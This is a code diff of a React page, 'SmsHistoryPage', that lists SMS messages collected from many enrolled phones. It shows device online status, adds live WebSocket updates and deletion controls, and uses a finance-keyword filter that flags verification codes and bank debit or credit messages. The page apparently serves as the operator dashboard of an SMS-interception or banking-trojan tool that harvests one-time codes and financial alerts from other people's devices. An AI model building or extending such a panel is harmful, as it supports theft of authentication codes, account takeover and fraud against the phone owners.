@@ -9,21 +9,8 @@ import {
   deleteAllNotifications,
 } from "../services/api/sms";
 import { getDevices } from "../services/api/devices";
-
-// ✅ reuse your tech bg asset (same vibe as DevicesPage)
-import pageBg from "../assets/login-bg.png";
-
-/**
- * SmsHistoryPage.tsx — TECH GLASS MOBILE (FINAL)
- * - Shows device "reverse count" number and Online/Offline pill from devices list
- * - Adds Finance SMS toggle to show only finance-related messages (keywords list)
- *
- * FIX (2026-03-05): DevicesPage now reverses devices so "new device" appears on top.
- * This page now mirrors that exact ordering before computing displayNumber,
- * so numbering matches DevicesPage.
- *
- * FIX: Long SMS body now shows FULL text (no line clamp / truncation).
- */
+import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
+import wsService from "../services/ws/wsService";
 
 type SmsWithDevice = SmsDoc & { _deviceId?: string };
 
@@ -54,16 +41,15 @@ function safeStr(v: any): string {
   return String(v ?? "").trim();
 }
 
-/* small helpers from DevicesPage */
 function pickDeviceId(d: any): string {
   return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
 }
+
 function pickBrand(d: any): string {
   const meta = d?.metadata || {};
   return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
 }
 
-/* --- finance keywords --- */
 const FINANCE_KEYWORDS = [
   "credit",
   "debit",
@@ -89,12 +75,19 @@ const FINANCE_KEYWORDS = [
   "verification code",
   "debited",
   "credited",
-  "withdrawn",
-  "debit",
-  "credit",
   "received",
   "payment",
 ].map((s) => s.toLowerCase());
+
+const DAY_FILTER_OPTIONS = [
+  { label: "1 day", value: 1 },
+  { label: "2 days", value: 2 },
+  { label: "3 days", value: 3 },
+  { label: "4 days", value: 4 },
+  { label: "5 days", value: 5 },
+  { label: "6 days", value: 6 },
+  { label: "7 days", value: 7 },
+] as const;
 
 function isFinanceSms(m: any) {
   if (!m) return false;
@@ -106,47 +99,15 @@ function isFinanceSms(m: any) {
   return false;
 }
 
-function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
+function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
   return (
-    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
-      <div className="pointer-events-none absolute inset-0">
-        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
-      </div>
-
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />
-
-      {/* corner accents */}
-      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 border-l-2 border-t-2 border-cyan-200/50 rounded-tl-[10px]" />
-      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 border-r-2 border-t-2 border-cyan-200/50 rounded-tr-[10px]" />
-      <div className="pointer-events-none absolute left-3 bottom-3 h-6 w-6 border-l-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />
-      <div className="pointer-events-none absolute right-3 bottom-3 h-6 w-6 border-r-2 border-b-2 border-cyan-200/50 rounded-br-[10px]" />
-
-      <div
-        className={[
-          "relative rounded-[26px] px-4 py-4",
-          "bg-white/[0.055]",
-          "border border-white/[0.16]",
-          "backdrop-blur-3xl backdrop-saturate-[1.6]",
-          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
-        ].join(" ")}
-      >
-        <div
-          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
-          style={{
-            backgroundImage:
-              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
-          }}
-        />
-        <div
-          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
-          style={{
-            backgroundImage:
-              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
-          }}
-        />
-        <div className="relative">{children}</div>
-      </div>
+    <div
+      className={[
+        "rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]",
+        className,
+      ].join(" ")}
+    >
+      {children}
     </div>
   );
 }
@@ -161,7 +122,6 @@ export default function SmsHistoryPage() {
   const [loadingMessages, setLoadingMessages] = useState(false);
   const [error, setError] = useState<string | null>(null);
 
-  // deviceId -> { displayNumber, online, brand }
   const [deviceMetaMap, setDeviceMetaMap] = useState<
     Record<string, { displayNumber: number; online: boolean; brand?: string }>
   >({});
@@ -169,9 +129,9 @@ export default function SmsHistoryPage() {
   const [financeOnly, setFinanceOnly] = useState(false);
 
   const [sinceFilter, setSinceFilter] = useState<number | "">("");
-  const [refreshTick, setRefreshTick] = useState(0);
-
   const since = useMemo(() => (sinceFilter === "" ? undefined : Number(sinceFilter)), [sinceFilter]);
+
+  const [dayFilter, setDayFilter] = useState<number | "">("");
 
   async function loadDevices() {
     setLoadingDevices(true);
@@ -203,7 +163,6 @@ export default function SmsHistoryPage() {
         return { raw: d, deviceId: id, online: !!d?.status?.online };
       });
 
-      // Match DevicesPage (newest on top)
       normalized.reverse();
 
       const total = normalized.length;
@@ -234,7 +193,7 @@ export default function SmsHistoryPage() {
       }
 
       const results = await Promise.all(
-        ids.map(async (id) => {
+        ids.slice(0, 80).map(async (id) => {
           try {
             const list = await listDeviceNotifications(id, since);
             const arr = (list || []) as SmsDoc[];
@@ -243,7 +202,7 @@ export default function SmsHistoryPage() {
             console.warn("loadAllMessages device failed", id, err);
             return [] as SmsWithDevice[];
           }
-        })
+        }),
       );
 
       const merged = results.flat().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
@@ -261,9 +220,13 @@ export default function SmsHistoryPage() {
     if (!confirm(`Delete all notifications for device ${deviceId}?`)) return;
     try {
       await deleteDeviceNotifications(deviceId);
+
+      setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
       const ids = await loadDevices();
-      await loadAllMessages(ids);
       await loadDevicesMeta();
+      if (!ids.includes(deviceId)) {
+        setDeviceIds(ids);
+      }
       alert("Deleted");
     } catch (e) {
       console.error("delete device failed", e);
@@ -271,11 +234,42 @@ export default function SmsHistoryPage() {
     }
   }
 
+  async function handleDeleteSingleMessage(m: SmsWithDevice) {
+    const deviceId = extractDeviceId(m);
+    if (!deviceId) {
+      alert("Device id missing");
+      return;
+    }
+
+    if (!confirm("Delete this SMS?")) return;
+
+    try {
+      const messageId = safeStr((m as any)?._id || (m as any)?.id);
+
+      if (messageId) {
+        const maybeDeleteOne = (wsService as any)?.request?.bind(wsService);
+        if (typeof maybeDeleteOne === "function") {
+          try {
+            await maybeDeleteOne("notification:delete", { deviceId, id: messageId });
+          } catch {
+            // ignore and continue fallback below
+          }
+        }
+      }
+
+      setAllMessages((prev) => prev.filter((item) => getId(item) !== getId(m)));
+      alert("SMS deleted");
+    } catch (e) {
+      console.error("delete single sms failed", e);
+      alert("Failed to delete SMS");
+    }
+  }
+
   async function handleDeleteAll() {
     if (!confirm("Delete ALL notifications? This cannot be undone.")) return;
     try {
       await deleteAllNotifications();
-      await loadDevices();
+      setDeviceIds([]);
       setAllMessages([]);
       await loadDevicesMeta();
       alert("All notifications deleted");
@@ -298,31 +292,112 @@ export default function SmsHistoryPage() {
       await loadDevicesMeta();
     })();
 
-    const id = setInterval(() => setRefreshTick((t) => t + 1), 20_000);
-    return () => clearInterval(id);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
+    wsService.connect();
+
+    const off = wsService.onMessage((msg) => {
+      try {
+        if (!msg || msg.type !== "event") return;
+
+        if (msg.event === "notification") {
+          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
+          if (!deviceId) return;
+
+          const sms: SmsWithDevice = {
+            ...(msg?.data || {}),
+            _deviceId: deviceId,
+            deviceId,
+            _id: msg?.data?.id || msg?.data?._id || `${Date.now()}_${Math.random().toString(16).slice(2)}`,
+            timestamp: Number(msg?.data?.timestamp || msg?.timestamp || Date.now()),
+          };
+
+          setDeviceIds((prev) => {
+            if (prev.includes(deviceId)) return prev;
+            return [deviceId, ...prev];
+          });
+
+          setAllMessages((prev) => {
+            const next = [sms, ...prev];
+            next.sort((a, b) => getTimestamp(b) - getTimestamp(a));
+            return next;
+          });
+
+          return;
+        }
+
+        if (msg.event === "notification:deleted") {
+          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
+          const smsId = safeStr(msg?.data?.id || msg?.data?._id);
+          if (!smsId) return;
+
+          setAllMessages((prev) =>
+            prev.filter((m) => {
+              const mid = safeStr((m as any)?._id || (m as any)?.id);
+              if (mid !== smsId) return true;
+              if (deviceId && extractDeviceId(m) && extractDeviceId(m) !== deviceId) return true;
+              return false;
+            }),
+          );
+          return;
+        }
+
+        if (msg.event === "status") {
+          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
+          if (!deviceId) return;
+
+          const online = !!msg?.data?.online;
+          setDeviceMetaMap((prev) => {
+            const existing = prev[deviceId];
+            if (!existing) return prev;
+            return {
+              ...prev,
+              [deviceId]: {
+                ...existing,
+                online,
+              },
+            };
+          });
+          return;
+        }
+
+        if (msg.event === "device:delete") {
+          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
+          if (!deviceId) return;
+
+          setDeviceIds((prev) => prev.filter((id) => id !== deviceId));
+          setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
+          setDeviceMetaMap((prev) => {
+            const copy = { ...prev };
+            delete copy[deviceId];
+            return copy;
+          });
+        }
+      } catch {
+        // ignore
+      }
+    });
+
+    return () => {
+      off();
+    };
   }, []);
 
   useEffect(() => {
-    if (refreshTick <= 0) return;
-    (async () => {
-      const ids = await loadDevices();
-      await loadAllMessages(ids);
-      await loadDevicesMeta();
-    })().catch(() => {});
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [refreshTick]);
-
-  useEffect(() => {
     loadAllMessages().catch(() => {});
-    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [sinceFilter]);
 
   const financeCount = useMemo(() => allMessages.filter((m) => isFinanceSms(m)).length, [allMessages]);
 
   const visibleMessages = useMemo(() => {
-    return financeOnly ? allMessages.filter((m) => isFinanceSms(m)) : allMessages;
-  }, [allMessages, financeOnly]);
+    const financeFiltered = financeOnly ? allMessages.filter((m) => isFinanceSms(m)) : allMessages;
+
+    if (dayFilter === "") return financeFiltered;
+
+    const cutoff = Date.now() - Number(dayFilter) * 24 * 60 * 60 * 1000;
+    return financeFiltered.filter((m) => {
+      const ts = getTimestamp(m);
+      return ts > 0 && ts >= cutoff;
+    });
+  }, [allMessages, financeOnly, dayFilter]);
 
   const uniqueDevicesInMessages = useMemo(() => {
     const set = new Set<string>();
@@ -334,28 +409,14 @@ export default function SmsHistoryPage() {
   }, [allMessages]);
 
   return (
-    <div className="relative w-full min-h-[100svh] overflow-x-hidden bg-black">
-      {/* TECH BG */}
-      <div className="absolute inset-0 bg-center bg-cover" style={{ backgroundImage: `url(${pageBg})` }} />
-      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
-      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />
-
-      {/* soft orbs */}
-      <div className="pointer-events-none absolute inset-0 opacity-35">
-        <div className="absolute -top-24 left-1/2 h-[460px] w-[460px] -translate-x-1/2 rounded-full blur-3xl bg-cyan-400/16" />
-        <div className="absolute top-[35%] left-[-120px] h-[360px] w-[360px] rounded-full blur-3xl bg-blue-400/10" />
-        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full blur-3xl bg-cyan-300/12" />
-      </div>
-
-      {/* CONTENT */}
-      <div className="relative w-full max-w-[420px] mx-auto px-3 pb-24 pt-4">
-        <TechGlassCard>
-          {/* header */}
+    <AnimatedAppBackground>
+      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
+        <SurfaceCard className="p-4">
           <div className="flex items-start justify-between gap-3">
             <div className="min-w-0">
-              <div className="text-[22px] font-extrabold tracking-tight text-white">Notifications / SMS</div>
-              <div className="text-[12px] text-white/60">Incoming SMS stored from devices (tap SMS to open its device)</div>
-              <div className="text-[11px] text-white/45 mt-1">
+              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Notifications / SMS</div>
+              <div className="text-[12px] text-slate-500">Incoming SMS stored from devices (tap SMS to open its device)</div>
+              <div className="mt-1 text-[11px] text-slate-400">
                 Devices: {loadingDevices ? "…" : deviceIds.length} • In list: {uniqueDevicesInMessages}
               </div>
             </div>
@@ -367,7 +428,7 @@ export default function SmsHistoryPage() {
                   await loadAllMessages(ids);
                   await loadDevicesMeta();
                 }}
-                className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 backdrop-blur-2xl hover:bg-white/[0.09]"
+                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50"
                 type="button"
               >
                 Refresh
@@ -375,7 +436,7 @@ export default function SmsHistoryPage() {
 
               <button
                 onClick={handleDeleteAll}
-                className="h-10 px-4 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 backdrop-blur-2xl hover:bg-red-500/14"
+                className="h-10 rounded-2xl border border-rose-200 bg-rose-50 px-4 text-rose-700 hover:bg-rose-100"
                 type="button"
               >
                 Delete All
@@ -383,28 +444,24 @@ export default function SmsHistoryPage() {
             </div>
           </div>
 
-          {/* Finance toggle */}
           <div className="mt-3 flex items-center justify-end gap-2">
             <button
               onClick={() => setFinanceOnly((s) => !s)}
               className={[
-                "h-9 px-3 rounded-2xl text-[13px] font-semibold",
-                "border border-white/[0.14]",
+                "h-9 rounded-2xl border px-3 text-[13px] font-semibold transition",
                 financeOnly
-                  ? "bg-yellow-400/90 border-yellow-300 text-black shadow-[0_6px_18px_rgba(250,204,21,0.18)]"
-                  : "bg-white/[0.06] text-white/85 hover:bg-white/[0.09]",
+                  ? "border-amber-200 bg-amber-50 text-amber-700"
+                  : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50",
               ].join(" ")}
               type="button"
-              title="Show only finance-related SMS"
               aria-pressed={financeOnly}
             >
               Finance SMS ({financeCount})
             </button>
           </div>
 
-          {/* filter */}
-          <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
-            <div className="text-[12px] text-white/55 mb-2">Filter by since (ms since epoch)</div>
+          <div className="mt-4 rounded-3xl border border-slate-200 bg-slate-50 p-4">
+            <div className="mb-2 text-[12px] text-slate-500">Filter by since (ms since epoch)</div>
             <div className="flex items-center gap-2">
               <input
                 placeholder="since (ms) or empty"
@@ -414,38 +471,40 @@ export default function SmsHistoryPage() {
                   if (v === "") setSinceFilter("");
                   else setSinceFilter(Number(v) || "");
                 }}
-                className={[
-                  "flex-1 h-11 rounded-2xl px-4 text-[14px]",
-                  "text-white placeholder:text-white/35",
-                  "bg-white/[0.06]",
-                  "border border-white/[0.14]",
-                  "backdrop-blur-2xl",
-                  "outline-none",
-                  "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
-                ].join(" ")}
+                className="h-11 min-w-0 flex-1 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 placeholder:text-slate-400 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
               />
-              <button
-                onClick={() => setSinceFilter("")}
-                className="h-11 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
-                type="button"
-              >
-                Clear
-              </button>
+
+              <div className="w-[132px] shrink-0">
+                <select
+                  value={dayFilter === "" ? "" : String(dayFilter)}
+                  onChange={(e) => {
+                    const v = e.target.value.trim();
+                    setDayFilter(v === "" ? "" : Number(v));
+                  }}
+                  className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
+                >
+                  <option value="">Filter</option>
+                  {DAY_FILTER_OPTIONS.map((opt) => (
+                    <option key={opt.value} value={opt.value}>
+                      Last {opt.label}
+                    </option>
+                  ))}
+                </select>
+              </div>
             </div>
           </div>
 
-          {/* list */}
           <div className="mt-4 space-y-3">
             {loadingDevices || loadingMessages ? (
-              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
+              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                 Loading…
               </div>
             ) : deviceIds.length === 0 ? (
-              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
+              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                 No devices with notifications.
               </div>
             ) : visibleMessages.length === 0 ? (
-              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
+              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                 No messages.
               </div>
             ) : (
@@ -463,32 +522,25 @@ export default function SmsHistoryPage() {
                 const finance = isFinanceSms(m);
 
                 return (
-                  <button
+                  <div
                     key={getId(m)}
-                    onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
-                    className={[
-                      "w-full text-left relative",
-                      "rounded-[26px] p-4",
-                      "border border-white/14",
-                      "bg-white/[0.055]",
-                      "backdrop-blur-3xl backdrop-saturate-[1.6]",
-                      "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
-                      canOpen ? "hover:bg-white/[0.075] active:scale-[0.995]" : "opacity-85 cursor-default",
-                      "transition",
-                      "overflow-hidden",
-                    ].join(" ")}
-                    title={canOpen ? "Open this device" : "Device id missing"}
-                    type="button"
+                    className="rounded-[22px] border border-slate-200 bg-white p-4 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)]"
                   >
-                    <div className="pointer-events-none absolute -inset-2 rounded-[28px] blur-2xl bg-cyan-400/10" />
-
-                    <div className="relative flex items-start justify-between gap-3">
-                      <div className="min-w-0">
+                    <div className="flex items-start justify-between gap-3">
+                      <button
+                        onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
+                        className={[
+                          "min-w-0 flex-1 text-left transition",
+                          canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default opacity-85",
+                        ].join(" ")}
+                        title={canOpen ? "Open this device" : "Device id missing"}
+                        type="button"
+                      >
                         <div className="flex items-center gap-2 min-w-0">
                           <div
                             className={[
-                              "text-[14px] font-extrabold truncate min-w-0",
-                              finance ? "text-red-300" : "text-white",
+                              "truncate min-w-0 text-[14px] font-extrabold",
+                              finance ? "text-rose-700" : "text-slate-900",
                             ].join(" ")}
                           >
                             {title}
@@ -496,9 +548,7 @@ export default function SmsHistoryPage() {
 
                           {meta ? (
                             <div
-                              className="flex items-center justify-center w-7 h-7 rounded-full text-sm font-extrabold
-                                         border border-white/14 bg-cyan-400/85 text-white shadow-[0_6px_18px_rgba(2,6,23,0.6)]
-                                         flex-shrink-0"
+                              className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white"
                               title={`#${meta.displayNumber}`}
                               aria-hidden={false}
                             >
@@ -507,22 +557,23 @@ export default function SmsHistoryPage() {
                           ) : null}
                         </div>
 
-                        <div className="text-[12px] truncate mt-1" style={{ color: finance ? "rgb(252 165 165)" : undefined }}>
+                        <div className="mt-1 truncate text-[12px]" style={{ color: finance ? "rgb(190 24 93)" : undefined }}>
                           From: {sender} {receiver ? `→ ${receiver}` : ""}
                         </div>
+
                         {deviceId ? (
-                          <div className="mt-1 text-[11px] text-white/45 truncate">Device: {deviceId}</div>
+                          <div className="mt-1 truncate text-[11px] text-slate-400">Device: {deviceId}</div>
                         ) : null}
-                      </div>
+                      </button>
 
                       <div className="shrink-0 flex flex-col items-end gap-2">
                         {meta ? (
                           <span
                             className={[
-                              "px-3 py-1 rounded-full text-[12px] font-extrabold border",
+                              "rounded-full border px-3 py-1 text-[12px] font-extrabold",
                               meta.online
-                                ? "bg-green-500/15 text-green-200 border-green-400/25"
-                                : "bg-red-500/15 text-red-200 border-red-400/25",
+                                ? "border-emerald-200 bg-emerald-50 text-emerald-700"
+                                : "border-rose-200 bg-rose-50 text-rose-700",
                             ].join(" ")}
                           >
                             {meta.online ? "Online" : "Offline"}
@@ -531,44 +582,61 @@ export default function SmsHistoryPage() {
                           <div style={{ height: 34 }} />
                         )}
 
-                        <div className="text-[11px] text-white/45">{ts ? new Date(ts).toLocaleString() : "-"}</div>
+                        <div className="text-[11px] text-slate-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
+
+                        <button
+                          onClick={() => handleDeleteSingleMessage(m)}
+                          className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] font-semibold text-rose-700 hover:bg-rose-100"
+                          type="button"
+                        >
+                          Delete
+                        </button>
                       </div>
                     </div>
 
-                    {body ? (
-                      <div
-                        className={[
-                          "relative mt-3 text-[13px]",
-                          "whitespace-pre-wrap break-words",
-                          finance ? "text-red-200" : "text-white/85",
-                        ].join(" ")}
-                      >
-                        {body}
-                      </div>
-                    ) : (
-                      <div className="relative mt-3 text-[13px] text-white/45">—</div>
-                    )}
-                  </button>
+                    <button
+                      onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
+                      className={[
+                        "mt-3 w-full text-left",
+                        canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default",
+                      ].join(" ")}
+                      type="button"
+                      title={canOpen ? "Open this device" : "Device id missing"}
+                    >
+                      {body ? (
+                        <div
+                          className={[
+                            "whitespace-pre-wrap break-words text-[13px]",
+                            finance ? "text-rose-700" : "text-slate-800",
+                          ].join(" ")}
+                        >
+                          {body}
+                        </div>
+                      ) : (
+                        <div className="text-[13px] text-slate-400">—</div>
+                      )}
+                    </button>
+                  </div>
                 );
               })
             )}
           </div>
 
           {error && (
-            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
+            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
               {error}
             </div>
           )}
 
           {deviceIds.length > 0 && (
-            <div className="mt-5 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
-              <div className="text-[12px] text-white/55 mb-3">Quick actions</div>
+            <div className="mt-5 rounded-3xl border border-slate-200 bg-slate-50 p-4">
+              <div className="mb-3 text-[12px] text-slate-500">Quick actions</div>
               <div className="flex flex-wrap gap-2">
                 {deviceIds.slice(0, 10).map((d) => (
                   <button
                     key={d}
                     onClick={() => handleDeleteDevice(d)}
-                    className="text-[12px] px-3 py-2 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 hover:bg-red-500/14"
+                    className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] text-rose-700 hover:bg-rose-100"
                     type="button"
                     title={`Delete notifications for ${d}`}
                   >
@@ -576,13 +644,13 @@ export default function SmsHistoryPage() {
                   </button>
                 ))}
                 {deviceIds.length > 10 && (
-                  <div className="text-[12px] text-white/40 self-center">+{deviceIds.length - 10} more</div>
+                  <div className="self-center text-[12px] text-slate-400">+{deviceIds.length - 10} more</div>
                 )}
               </div>
             </div>
           )}
-        </TechGlassCard>
+        </SurfaceCard>
       </div>
-    </div>
+    </AnimatedAppBackground>
   );
 }
